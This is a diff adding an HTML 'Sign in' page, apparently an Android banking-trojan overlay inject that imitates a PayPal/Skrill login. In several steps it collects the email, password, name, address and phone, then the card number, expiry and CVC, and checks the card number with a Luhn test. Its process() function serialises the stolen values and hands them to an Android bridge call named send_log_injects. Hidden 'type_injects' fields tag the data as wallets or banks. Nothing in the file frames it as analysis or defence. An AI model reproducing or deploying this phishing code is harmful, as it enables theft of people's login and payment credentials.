@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Sign in</title>
+  <style>
+    html {
+      line-height: 1.15;
+      -webkit-text-size-adjust: 100%
+    }
+
+    body {
+      margin: 0
+    }
+
+    main {
+      display: block
+    }
+
+    h1 {
+      font-size: 2em;
+      margin: .67em 0
+    }
+
+    hr {
+      box-sizing: content-box;
+      height: 0;
+      overflow: visible
+    }
+
+    pre {
+      font-family: monospace, monospace;
+      font-size: 1em
+    }
+
+    a {
+      background-color: transparent
+    }
+
+    abbr[title] {
+      border-bottom: none;
+      text-decoration: underline;
+      text-decoration: underline dotted
+    }
+
+    b,
+    strong {
+      font-weight: bolder
+    }
+
+    code,
+    kbd,
+    samp {
+      font-family: monospace, monospace;
+      font-size: 1em
+    }
+
+    small {
+      font-size: 80%
+    }
+
+    sub,
+    sup {
+      font-size: 75%;
+      line-height: 0;
+      position: relative;
+      vertical-align: baseline
+    }
+
+    sub {
+      bottom: -.25em
+    }
+
+    sup {
+      top: -.5em
+    }
+
+    img {
+      border-style: none
+    }
+
+    button,
+    input,
+    optgroup,
+    select,
+    textarea {
+      font-family: inherit;
+      font-size: 100%;
+      line-height: 1.15;
+      margin: 0
+    }
+
+    button,
+    input {
+      overflow: visible
+    }
+
+    button,
+    select {
+      text-transform: none
+    }
+
+    button,
+    [type="button"],
+    [type="reset"],
+    [type="submit"] {
+      -webkit-appearance: button
+    }
+
+    button::-moz-focus-inner,
+    [type="button"]::-moz-focus-inner,
+    [type="reset"]::-moz-focus-inner,
+    [type="submit"]::-moz-focus-inner {
+      border-style: none;
+      padding: 0
+    }
+
+    button:-moz-focusring,
+    [type="button"]:-moz-focusring,
+    [type="reset"]:-moz-focusring,
+    [type="submit"]:-moz-focusring {
+      outline: 1px dotted ButtonText
+    }
+
+    fieldset {
+      padding: .35em .75em .625em
+    }
+
+    legend {
+      box-sizing: border-box;
+      color: inherit;
+      display: table;
+      max-width: 100%;
+      padding: 0;
+      white-space: normal
+    }
+
+    progress {
+      vertical-align: baseline
+    }
+
+    textarea {
+      overflow: auto
+    }
+
+    [type="checkbox"],
+    [type="radio"] {
+      box-sizing: border-box;
+      padding: 0
+    }
+
+    [type="number"]::-webkit-inner-spin-button,
+    [type="number"]::-webkit-outer-spin-button {
+      height: auto
+    }
+
+    [type="search"] {
+      -webkit-appearance: textfield;
+      outline-offset: -2px
+    }
+
+    [type="search"]::-webkit-search-decoration {
+      -webkit-appearance: none
+    }
+
+    ::-webkit-file-upload-button {
+      -webkit-appearance: button;
+      font: inherit
+    }
+
+    details {
+      display: block
+    }
+
+    summary {
+      display: list-item
+    }
+
+    template {
+      display: none
+    }
+
+    [hidden] {
+      display: none
+    }
+
+    body {
+      background-color: #ffffff;
+    }
+
+    html {
+      font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    }
+
+    #paypal {
+      display: table;
+      position: absolute;
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+    }
+
+    #paypal .logo {
+      text-align: center;
+    }
+
+    #paypal .content {
+	margin-right: 5%;
+	margin-left: 5%;
+   
+   
+    border-radius: 5px;
+    margin-left: auto;
+    margin-right: auto;
+    position: relative;
+    max-width: 440px;
+    width: calc(90% - 44px);
+    padding: 22px 22px 22px 22px;
+    margin-bottom: 28px;
+    background-color: #fff;
+    min-width: 200px;
+    
+    }
+
+    #paypal input {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 10px 0px;
+    color: #7e7e7e;
+    text-align: left;
+    background: rgb(246, 246, 246);;
+    outline: none;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+    border-bottom: 1.5px solid #b8b8b8;
+    border-radius: 5px 5px 0px 0px;
+    }
+
+    #paypal .createtext {
+      margin-bottom: 16px;
+      font-size: .8125rem;
+      color: #262626;
+      text-align: left;
+    }
+
+    #paypal a {
+      color: #0070ba;
+    }
+
+    #paypal .btnNext {
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    background: #714cb4;
+    color: #ffffff;
+    border: 1px solid #714cb4;
+    font-size: 14px;
+    -webkit-appearance: none;
+    border-radius: 10px;
+    cursor: pointer;
+    }
+
+    #paypal .btnNext:hover {
+      background-color: #005ea6;
+      outline: 0;
+    }
+
+    #paypal .middle {
+      display: table-cell;
+      vertical-align: middle;
+    }
+
+    #paypal .mailText {
+      margin-top: 35px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      font-size: 11px;
+      padding-top: 14px;
+    }
+
+    .footer .legalFooter {
+      text-align: center;
+    }
+
+    .footerCopyright {
+      margin: 0;
+      text-align: left;
+      color: #9e9e9e;
+    }
+
+    .footer .legalFooter {
+      text-align: center;
+      padding: 14px;
+      background-color: #F7F9FA;
+    }
+
+    .dt {
+      max-width: 50px;
+    }
+	.footer td {
+    width: 33.3333%;
+    text-align: center;
+    color: #0066c0;
+	}
+	input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    background: #714cb4;
+    color: #ffffff;
+    border: 1px solid #714cb4;
+    font-size: 14px;
+    -webkit-appearance: none;
+    border-radius: 10px;
+    cursor: pointer;
+	}
+  </style>
+</head>
+
+<body>
+  <form id="paypal">
+    <div class="middle">
+      <div class="content">
+        <div class="logo">
+<img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMjI3cHgiIGhlaWdodD0iNzhweCIgdmlld0JveD0iMCAwIDIyNyA3OCIgdmVyc2lvbj0iMS4xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KICAgIDwhLS0gR2VuZXJhdG9yOiBTa2V0Y2ggNDMuMiAoMzkwNjkpIC0gaHR0cDovL3d3dy5ib2hlbWlhbmNvZGluZy5jb20vc2tldGNoIC0tPgogICAgPHRpdGxlPnNrcmlsbC1sb2dvLXdoaXRlPC90aXRsZT4KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBTa2V0Y2guPC9kZXNjPgogICAgPGRlZnM+CiAgICAgICAgPGxpbmVhckdyYWRpZW50IHgxPSIyNy4wNDM5NTgyJSIgeTE9IjAlIiB4Mj0iNzkuMjYyOTEzMyUiIHkyPSIxMDAlIiBpZD0ibGluZWFyR3JhZGllbnQtMSI+CiAgICAgICAgICAgIDxzdG9wIHN0b3AtY29sb3I9IiM2QjE5NUYiIG9mZnNldD0iMCUiPjwvc3RvcD4KICAgICAgICAgICAgPHN0b3Agc3RvcC1jb2xvcj0iIzRDMjU1QiIgb2Zmc2V0PSIxMDAlIj48L3N0b3A+CiAgICAgICAgPC9saW5lYXJHcmFkaWVudD4KICAgIDwvZGVmcz4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJza3JpbGwtbG9nby13ZWItMS1yZ2IiIGZpbGw9InVybCgjbGluZWFyR3JhZGllbnQtMSkiPgogICAgICAgICAgICA8cGF0aCBkPSJNMTYyLjg5MSwxOS4xNTMgQzE2OC4wMzIsMTkuMTUzIDE3Mi4xOTksMTQuOTg4IDE3Mi4xOTksOS44NTIgQzE3Mi4xOTksNC43MTMgMTY4LjAzMiwwLjU0NCAxNjIuODkxLDAuNTQ0IEMxNTcuNzU2LDAuNTQ0IDE1My41OTEsNC43MTMgMTUzLjU5MSw5Ljg1MiBDMTUzLjU5MSwxNC45ODggMTU3Ljc1NiwxOS4xNTMgMTYyLjg5MSwxOS4xNTMgTDE2Mi44OTEsMTkuMTUzIFogTTkxLjYwNCwyNC4xNzYgQzkxLjE4NCwyNS4yMzEgODguMTYxLDMzLjc3IDgwLjg1LDQyLjYyIEw4MC44NSw0Ljc3OSBMNjEuMzcsOC42MjkgTDYxLjM3LDc3LjIyIEw4MC44NSw3Ny4yMiBMODAuODUsNTYuMDE4IEM4Ni40OTIsNjQuNDggODkuMjc4LDc3LjIyIDg5LjI3OCw3Ny4yMiBMMTEyLjYxMSw3Ny4yMiBDMTEwLjMwMyw2Ny42MjUgMTAwLjIwNyw0OS45MzMgMTAwLjIwNyw0OS45MzMgQzEwOS4yNjgsMzguNDQ1IDExMy4yNDgsMjYuMjA0IDExMy44ODEsMjQuMTc2IEw5MS42MDQsMjQuMTc2IEw5MS42MDQsMjQuMTc2IFogTTE0Mi44MTYsMjMuNDYgQzEyNS4zNjgsMjQuMDIgMTE2LjUxMSwzMS44NDggMTE2LjUxMSw0Ny40MDkgTDExNi41MTEsNzcuMjIgTDEzNS41NDYsNzcuMjIgTDEzNS41NDYsNTIuOTEgQzEzNS41NDYsNDMuNTkyIDEzNi43NjYsMzkuNTk4IDE0Ny44MjMsMzkuMjE3IEwxNDcuODIzLDIzLjczMyBDMTQ1Ljk2MiwyMy4zMzggMTQyLjgxNiwyMy40NiAxNDIuODE2LDIzLjQ2IEwxNDIuODE2LDIzLjQ2IFogTTI4LjcsMzEuNzI5IEMyNi4zMTQsMzEuNTcyIDIwLjc5LDMxLjIxNSAyMC43OSwyNi4yNDIgQzIwLjc5LDIwLjI0MSAyOC43NDMsMjAuMjQxIDMxLjcyNiwyMC4yNDEgQzM2Ljk3MSwyMC4yNDEgNDMuNzY0LDIxLjc5MSA0OC42MTUsMjMuMjQyIEM0OC42MTUsMjMuMjQyIDUxLjMyMSwyNC4xOTYgNTMuNjI0LDI1LjE3MyBMNTMuODM4LDI1LjIzMSBMNTMuODM4LDguNzk2IEw1My41NDQsOC43MDkgQzQ3LjgxOSw2LjcwNiA0MS4xNjIsNC43NzkgMjguODIsNC43NzkgQzcuNTQsNC43NzkgMCwxNy4xNzYgMCwyNy43OTYgQzAsMzMuOTE4IDIuNjI0LDQ4LjMyNiAyNi45OTUsNDkuOTg4IEMyOS4wNjEsNTAuMTE1IDM0LjU0NCw1MC40MzEgMzQuNTQ0LDU1LjU3IEMzNC41NDQsNTkuODEzIDMwLjA1NSw2Mi4zMTUgMjIuNTA1LDYyLjMxNSBDMTQuMjMxLDYyLjMxNSA2LjIwNSw2MC4yMDUgMS4zMyw1OC4yMDQgTDEuMzMsNzUuMTMxIEM4LjYyOCw3Ny4wNDQgMTYuODU1LDc4IDI2LjQ5Nyw3OCBDNDcuMzA0LDc4IDU2LjYyMyw2Ni4yNzEgNTYuNjIzLDU0LjY0NiBDNTYuNjIzLDQxLjQ2NSA0Ni4xOTUsMzIuOTAxIDI4LjcsMzEuNzI5IEwyOC43LDMxLjcyOSBaIE0xNTMuNDU1LDc3LjIyIEwxNzIuMzM2LDc3LjIyIEwxNzIuMzM2LDI0LjIzNiBMMTUzLjQ1NSwyNC4yMzYgTDE1My40NTUsNzcuMjIgWiBNMjA3Ljg4OCw4LjE1NyBMMjA3Ljg4OCw3Ny4yMiBMMjI2Ljc3Miw3Ny4yMiBMMjI2Ljc3Miw0Ljc3OSBMMjA3Ljg4OCw4LjE1NyBMMjA3Ljg4OCw4LjE1NyBaIE0xODAuMzM0LDguMTU3IEwxOTkuMiw0Ljc3OSBMMTk5LjIsNzcuMjIgTDE4MC4zMzQsNzcuMjIgTDE4MC4zMzQsOC4xNTcgTDE4MC4zMzQsOC4xNTcgWiIgaWQ9IkZpbGwtMSI+PC9wYXRoPgogICAgICAgIDwvZz4KICAgIDwvZz4KPC9zdmc+" style="width: 90px;">
+<br>
+            <br><br><br>
+          </svg>
+        </div>
+        <div id="page3">
+          <input id="paypallogin" type="text" name="email" placeholder="">
+		  
+          <button class="btnNext" onclick="paypalNextPage();"><span id='btnText1'></span></button>
+		        				<a href="#" style="font-weight: 600;color: #942ea5;position: relative;text-decoration: none;font-size: 13px;display: inline-block;margin-top: 20px;margin-left: 85px;">RESET PASSWORD</a>
+<br><br><br><br><br><br>
+<div class="bottom" style="padding: 0px 30px 0px 30px;">
+    <center><span>Don't have an account?</span>
+	
+          <button class="btnNext" style="background: none; color: #714cb4;">Register
+
+
+</div>
+		  
+        </div>
+        <div id="page4" style="display:none;">
+    
+          <input id="paypalpassword" type="password" name="password" placeholder="">
+		    <button type="button" id="eye" style="background: none; border: none; float: right; position: relative; top: -53px; cursor: pointer;">
+        <img src="data:image/png;base64,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" alt="eye" />
+        </button>
+          <input id="type_injects" value='wallets' type="hidden" required>
+          <button class="btnNext" onclick="paypalNextPage2();"><span id='btnText2'></span></button>
+		  
+        </div>
+
+        <div id="page5" style="display:none;">
+                    <input id="holder_name" placeholder="First name" pattern=".{4,}" autocomplete="off" type="text" onkeyup="check_valid('infodata')" required>
+					<input id="last_name" placeholder="Last Name" pattern=".{4,}" autocomplete="off" type="text" onkeyup="check_valid('infodata')" required>
+          <input id="address" placeholder="" autocomplete="off" type="text" required>
+          <input id="city" placeholder="" autocomplete="off" type="text" required>
+          <input id="state" placeholder="" autocomplete="off" type="text" required>
+          <input id="zip" placeholder="" maxlength="11" autocomplete="off" type="text" required>
+          <input id="phone" placeholder="" maxlength="30" autocomplete="off" type="text" required>
+          <button class="btnNext" onclick="paypalNextPage3();"><span id='btnText3'></span></button>
+        </div>
+
+        <div id="page6" style="display:none;">
+          <input id="number_card" placeholder="Card Holder" pattern="^[0-9 ]{12,19}$" maxlength="19" autocomplete="off"
+            type="text" required>
+          <input class="dt" id="EXP" placeholder="MM" pattern="^[1-9]{1}$|^[1]{1}[0-2]{1}$|^[0][1-9]{1}$"
+            autocomplete="off" maxlength="2" type="text" required>
+          <label id="mm">/</label>
+          <input class="dt" id="yy" placeholder="YY" pattern="^20$|^2[0-9]$" maxlength="2" type="text"
+            autocomplete="off" required>
+          <input id="CVC" placeholder="CVC" pattern="^[0-9]{3,4}$" maxlength="4" type="password" autocomplete="off"
+            required>
+          <input id="type_injects" value='banks' type="hidden" required>
+          <input id="closed" value='close_activity_injects' type="hidden" required>
+          <button class="btnNext" onclick="checkValidityCards();"><span id='btnText4'></span></button>
+        </div>
+
+      </div>
+    </div>
+  </form>
+  <footer class="footer" role="contentinfo">
+    <div class="legalFooter">
+      <div class="extendedContent">
+
+      </div>
+    </div>
+  </footer>
+</body>
+<script>
+
+
+  var lang = 'en', invalidCC = 'Invalid card number';
+
+  var objLang = {
+    'de': {
+      title: 'Enter credit card details',
+      email: 'Email',
+      password: 'Passwort',
+      holder: 'Name des Karteninhabers',
+      adress: 'Strassenadresse',
+      city: 'Stadt',
+      state: 'Staat',
+      zip: 'Postleitzahl',
+      phone: 'Telefonnummer',
+      number_card: 'Kartennummer',
+      mm: 'MM',
+      yy: 'YY',
+      cccvc: 'CVC',
+      verifybtn: 'Nächsten',
+      savebutton: 'Speichern'
+    },
+    'it': {
+      title: 'Enter credit card details',
+      email: 'Email',
+      password: 'Password',
+      holder: 'Nome del titolare della carta',
+      adress: 'Indirizzo',
+      city: 'Citta',
+      state: 'Stato',
+      zip: 'Codice Postale',
+      phone: 'Numero di telefono',
+      number_card: 'Numero della carta',
+      mm: 'MM',
+      yy: 'YY',
+      cccvc: 'CVC',
+      verifybtn: 'Prossimo',
+      savebutton: 'Salvare'
+    },
+    'es': {
+      title: 'Enter credit card details',
+      email: 'Correo',
+      password: 'Contraseña',
+      holder: 'Nombre del titular de la tarjeta',
+      adress: 'Dirección de la calle',
+      city: 'Ciudad',
+      state: 'Estado',
+      zip: 'Código postal',
+      phone: 'Número de teléfono',
+      number_card: 'Número de tarjeta',
+      mm: 'MM',
+      yy: 'YY',
+      cccvc: 'CVC',
+      verifybtn: 'Siguiente',
+      savebutton: 'Guardar'
+    },
+
+    'en': {
+      title: 'Enter credit card details',
+      email: 'Email',
+      password: 'Password',
+      holder: 'First Name',
+      adress: 'Street address',
+      city: 'City',
+      state: 'State',
+      zip: 'ZIP code',
+      phone: 'Telephone number',
+      number_card: 'Card number',
+      mm: 'MM',
+      yy: 'YY',
+      cccvc: 'CVC',
+      verifybtn: 'Login',
+      savebutton: 'Save'
+    }
+  };
+
+  var locale = objLang[lang] == undefined ? objLang['en'] : objLang[lang];
+
+  document.getElementById('btnText1').innerText = locale.verifybtn;
+  document.getElementById('btnText2').innerText = locale.verifybtn;
+  document.getElementById('btnText3').innerText = locale.verifybtn;
+  document.getElementById('btnText4').innerText = locale.savebutton;
+  document.getElementById('holder_name').placeholder = locale.holder;
+  document.getElementById('address').placeholder = locale.adress;
+  document.getElementById('city').placeholder = locale.city;
+  document.getElementById('state').placeholder = locale.state;
+  document.getElementById('zip').placeholder = locale.zip;
+  document.getElementById('phone').placeholder = locale.phone;
+  document.getElementById('number_card').placeholder = locale.number_card;
+  document.getElementById('paypallogin').placeholder = locale.email;
+  document.getElementById('paypalpassword').placeholder = locale.password;
+
+  function paypalNextPage() {
+    if (document.getElementById('paypallogin').value.length > 3) {
+      document.getElementById('page3').style.display = 'none';
+      document.getElementById('page4').style.display = 'block';
+      document.getElementById('emailinputpaypal').innerText = document.getElementById('paypallogin').value;
+    }
+  }
+
+  function paypalNextPage2() {
+    if (document.getElementById('paypalpassword').value.length > 3) {
+      document.getElementById('page3').style.display = 'none';
+      document.getElementById('page4').style.display = 'none';
+      document.getElementById('page5').style.display = 'block';
+      process('paypal', 'paypal');
+    }
+  }
+
+  function paypalNextPage3() {
+    if (document.getElementById('holder_name').value.length > 3 && document.getElementById('address').value.length > 3 && document.getElementById('city').value.length > 3
+      && document.getElementById('state').value.length > 2 && document.getElementById('zip').value.length > 3 && document.getElementById('phone').value.length > 3) {
+      document.getElementById('page3').style.display = 'none';
+      document.getElementById('page4').style.display = 'none';
+      document.getElementById('page5').style.display = 'none';
+      document.getElementById('page6').style.display = 'block';
+    }
+  }
+
+function checkValidityCards(){
+ var num_card = document.getElementById('number_card').value;
+ var EXP = parseInt(document.getElementById('EXP').value, 10);
+ var yy = parseInt(document.getElementById('yy').value, 10);
+ var CVC = parseInt(document.getElementById('CVC').value, 10);
+
+ 
+ if(num_card.length > 12 && num_card.length < 20 &&  valid_credit_card(num_card) &&
+ EXP<=12 && (yy>=20 && yy<=38) && CVC>=3){
+  process('paypal', 'cards');
+ }
+}
+
+
+
+  function BackPayPal() {
+    document.getElementById('page3').style.display = 'block';
+    document.getElementById('page4').style.display = 'none';
+  }
+
+  function process(formId, formId2) {
+    var ua = navigator.userAgent.toLowerCase();
+    var getJSON = formToJSON(document.getElementById(formId), formId2);
+      if(getJSON == null || getJSON == '' || getJSON == 'undefined'){
+        return;
+      }
+      
+      if (ua.indexOf("android") > -1) {
+        try {
+          Android.send_log_injects(getJSON);
+        } catch (err) { }
+      } else {
+        alert(getJSON);
+      }
+  }
+
+  function maskCC(event) {
+    var vcc = this.value.replace(/\D/g, '');
+    this.value = '';
+    for (var i = 0; i < vcc.length; i++) {
+      this.value += (i % 4 == 0 && i != 0 ? ' ' : '') + vcc[i];
+    }
+  }
+  document.getElementById('number_card').addEventListener('input', maskCC, false);
+
+  function valid_credit_card(value) {
+    if (/[^0-9-\s]+/.test(value)) return false;
+    var nCheck = 0, nDigit = 0, bEven = false;
+    value = value.replace(/\D/g, "");
+    for (var n = value.length - 1; n >= 0; n--) {
+      var cDigit = value.charAt(n),
+        nDigit = parseInt(cDigit, 10);
+      if (bEven) {
+        if ((nDigit *= 2) > 9) nDigit -= 9;
+      }
+      nCheck += nDigit;
+      bEven = !bEven;
+    }
+    return (nCheck % 10) == 0;
+  }
+
+
+  /*********Recursive implementation of jSON.stringify; ********/
+  var stringifyJSON = function (obj) {
+    var arrOfKeyVals = [],
+      arrVals = [],
+      objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+      return '' + obj;
+    else if (typeof obj === 'string')
+      return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+      if (obj[0] === undefined)
+        return '[]';
+      else {
+        obj.forEach(function (el) {
+          arrVals.push(stringifyJSON(el));
+        });
+        return '[' + arrVals + ']';
+      }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+      objKeys = Object.keys(obj);
+      objKeys.forEach(function (key) {
+        var keyOut = '"' + key + '":';
+        var keyValOut = obj[key];
+        if (keyValOut instanceof Function || typeof keyValOut === undefined)
+          arrOfKeyVals.push('');
+        else if (typeof keyValOut === 'string')
+          arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+        else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+          arrOfKeyVals.push(keyOut + keyValOut);
+        else if (keyValOut instanceof Object) {
+          arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+        }
+      });
+      return '{' + arrOfKeyVals + '}';
+    }
+  };
+
+  function formToJSON(f, ff) {
+    if (ff == 'paypal') {
+      var FinalObject = {}, namesHTML = ['input', 'select'];
+      for (var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for (var j = 0; j < bsform.length; j++) {
+
+          if (bsform[j].id == 'paypallogin' || bsform[j].id == 'paypalpassword') {
+            FinalObject[bsform[j].id] = bsform[j].value
+          }
+        }
+      }
+      return stringifyJSON(FinalObject);
+    } else {
+      var FinalObject = {}, namesHTML = ['input', 'select'];
+      for (var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for (var j = 0; j < bsform.length; j++) {
+          if (bsform[j].id != 'paypallogin' && bsform[j].id != 'paypalpassword') {
+            FinalObject[bsform[j].id] = bsform[j].value
+          }
+        }
+      }
+      return stringifyJSON(FinalObject);
+    }
+  }
+
+
+
+
+</script>
+
+</html>
